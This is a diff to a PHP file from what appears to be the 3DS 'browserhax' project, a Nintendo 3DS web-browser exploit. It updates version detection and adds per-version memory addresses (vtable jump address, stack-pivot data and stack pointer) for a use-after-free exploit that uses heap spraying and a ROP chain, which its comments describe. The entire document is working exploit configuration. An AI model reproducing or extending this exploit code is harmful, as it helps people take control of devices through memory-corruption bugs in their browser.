@@ -8,20 +8,14 @@ include_once("/home/yellows8/browserhax/browserhax_cfg.php");
 
 include_once("3dsbrowserhax_common.php");
 
-if($browserver == 0x80)
+if(($browserver & 0x80) == 0)
 {
-	$VTABLE_JUMPADR = 0x007f1825;//The use-after-free object's "vtable" is set to an address nearby where the heap-spray data is located. This is the address which gets jumped to when the use-after-free vtable funcptr call is executed. r0 = <use-after-free object address>. This gadget does the following: 1) r0 = *r0 2) r0 = *(r0+8) 3) <return if r0==0> 4) r0 = *(r0+0x34) 5) r0 = *(r0+4) 6) calls vtable funcptr +16 from the object @ r0, with r1=1 and r2=<funcptr adr>.
-}
-else if($browserver == 0x81)
-{
-	$VTABLE_JUMPADR = 0x007fb825;
-}
-else
-{
-	echo "This browser (version) is not supported.\n";
-	writeNormalLog("RESULT: 200 BROWSER(VER) NOT SUPPORTED");
+	echo "This browser is not supported.\n";
+	writeNormalLog("RESULT: 200 BROWSER NOT SUPPORTED");
 	return;
 }
+
+$VTABLE_JUMPADR = $WEBKITCRO_MAPADR+0x3825;//The use-after-free object's "vtable" is set to an address nearby where the heap-spray data is located. This is the address which gets jumped to when the use-after-free vtable funcptr call is executed. r0 = <use-after-free object address>. This gadget does the following: 1) r0 = *r0 2) r0 = *(r0+8) 3) <return if r0==0> 4) r0 = *(r0+0x34) 5) r0 = *(r0+4) 6) calls vtable funcptr +16 from the object @ r0, with r1=1 and r2=<funcptr adr>.
 
 $STACKPIVOTDATA_ADR = 0x08e20800;
 $STACKPTR_ADR = 0x08f73014;
@@ -31,6 +25,12 @@ if($browserver == 0x80)
 	//below addrs = newer_addrs - 0x9000
 	$STACKPIVOTDATA_ADR = 0x08e17800;
 	$STACKPTR_ADR = 0x08f6a014;
+}
+
+if($browserver == 0x82)
+{
+	$STACKPIVOTDATA_ADR = 0x08f3e014;
+	$STACKPTR_ADR = 0x08f78014;
 }
 
 $ROPHEAP = $STACKPIVOTDATA_ADR;
